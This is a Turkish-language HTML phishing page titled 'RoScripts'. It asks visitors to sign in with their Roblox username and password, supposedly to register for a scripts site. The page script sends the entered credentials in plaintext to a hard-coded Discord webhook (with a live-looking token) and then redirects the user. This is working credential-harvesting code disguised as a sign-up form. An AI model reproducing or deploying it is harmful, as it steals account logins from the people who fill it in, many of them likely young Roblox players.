<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kayıt Ol - RoScripts</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #111; /* Siyah arka plan */
      color: white;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    .form-container {
      background-color: #2c2f38;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
      width: 350px;
    }

    h1 {
      font-size: 26px;
      text-align: center;
      margin-bottom: 20px;
      font-weight: bold;
    }

    label {
      font-size: 14px;
      margin-bottom: 5px;
      display: block;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 20px;
      font-size: 16px;
      border: 1px solid #333;
      border-radius: 5px;
      background-color: #444;
      color: white;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #4CAF50;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #45a049;
    }

    .error-message {
      color: red;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h1>Roblox Hesabınızla Kayıt Olun</h1>
    <form id="register-form">
      <label for="username">Kullanıcı Adı:</label>
      <input type="text" id="username" name="username" required><br>

      <label for="password">Şifre:</label>
      <input type="password" id="password" name="password" required><br>

      <button type="submit">Kayıt Ol</button>
    </form>
    <p class="error-message" id="error-message"></p>
  </div>

  <script>
    document.getElementById('register-form').addEventListener('submit', function(event) {
      event.preventDefault();
      
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      // Webhook ile Discord'a gönderme işlemi
      const webhookURL = 'https://canary.discord.com/api/webhooks/1313523578217566278/no2aSqXSwdOxZcK9qEPWjDXT5m3UY3cMIwmJG6524zQS3a7VlEG_LWATo4g30Wdn00ie'; // Discord webhook URL'nizi buraya ekleyin
      const data = {
        content: `Yeni Kayıt: Kullanıcı Adı: ${username}, Şifre: ${password}`
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(response => {
        if (response.ok) {
          // Başarıyla gönderildiğinde, kullanıcıyı scripts sayfasına yönlendirme
          localStorage.setItem('userLoggedIn', 'true');
          window.location.href = 'roscripts/scripts.html'; // Kayıt sonrası script sayfasına yönlendir
        } else {
          // Hata durumunda mesaj göster
          document.getElementById('error-message').innerText = 'Bir hata oluştu, tekrar deneyin.';
        }
      })
      .catch(error => {
        console.error('Webhook hatası:', error);
        document.getElementById('error-message').innerText = 'Bir hata oluştu, tekrar deneyin.';
      });
    });
  </script>
</body>
</html>
